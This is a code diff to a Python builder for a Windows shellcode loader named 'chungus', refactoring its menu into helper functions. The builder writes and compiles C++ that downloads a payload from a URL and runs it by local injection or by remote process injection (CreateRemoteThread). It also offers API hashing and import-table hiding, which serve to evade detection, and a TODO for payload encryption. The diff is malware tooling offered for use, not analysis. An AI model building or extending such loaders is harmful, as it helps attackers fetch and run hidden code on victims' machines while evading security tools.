@@ -1,5 +1,6 @@
 import os
 import time
+from cli import *
 
 def build (Enumeration, ProcessName, Loader, Url):
     f = open ("main.cpp", "a")
@@ -65,7 +66,7 @@ int main()
 
     f.close()
     time.sleep(2)
-    os.system(f"C:\\msys64\\mingw64\\bin\\g++ -O2 -s -o chungus main.cpp -lwininet -lws2_32 -mwindows")
+    os.system(f"C:\\msys64\\mingw64\\bin\\g++ -O2 -w -s -o chungus main.cpp -lwininet -lws2_32 -mwindows")
     #result = subprocess.run(['g++', '-o', 'chungus', 'main.cpp','-lwininet', '-lws2_32', '-mwindows'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     #print(result)
 
@@ -102,63 +103,23 @@ def restore_header_file(Enumeration, Loader, ApiMode):
         file.write(content)
 
 def main():
-    Url = input("""\nSet Payload Url or type local For localhost:8000 (test): 
 
-    >> """)
-    
-    if Url == "local":
-        Url = "http://localhost:8000/payload.bin"
-
-    Loader = input("""\nEnter Injection Techinque: 
-    1. Local Injection
-    2. Remote Process Injection
-
-    >> """)
- 
-    if Loader == "1":
-        Loader = "LocalInjection.h"
-        Enumeration = "null"
-        ProcessName = "null"
-    elif Loader == "2":
-        Enumeration = input("""\nEnter Process/Thread Enumeration Techinque: 
-    1. Enumeration via Snapshot
-
-    >> """)
-        if Enumeration == "1":
-            Enumeration = "ProcessEnum32Snapshot.h"
-            ProcessName = input("""\nEnter Target Process Name:
-                                
-    >> """)
-            if ProcessName == "": 
-                print("Invalid Input")
-                exit()
-        else:
-            print("Invalid Input")
-            exit()
-        Loader = input("""\nEnter Injection Techinque:
-    1. Remote Process Injection - (CreateRemoteThread)
-                       
-    >> """)
-        if Loader == "1":
-            Loader = "RemoteInjection.h"
-                       
+    if set_payload_location() == "2":
+        Url = set_url()
     else:
-        print("Invalid Input")
         exit()
     
-    ApiMode = input("""\nSelect API Hashing Mode:
-    1. Plain IAT
-    2. IAT Hiding (No Hashing)
-    3. Hashing (Rotr32)
+    #TODO  set_payload_encryption()
 
-    >> """)
-    if ApiMode == "1":
-        ApiMode = "ApiPlainIat.h"
-    elif ApiMode == "2":
-        ApiMode = "ApiNoHash.h"
-    elif ApiMode == "3":
-        ApiMode =  "ApiCtHash.h"
-    
+    if set_loader_type() == "1":
+        Loader = set_local_loader_type()
+        Enumeration = "null"
+        ProcessName = "null"
+    else:
+        pass
+              
+    ApiMode = set_api_mode()
+
     change_header_file(Enumeration, Loader, ApiMode)
 
     if build(Enumeration, ProcessName, Loader, Url):
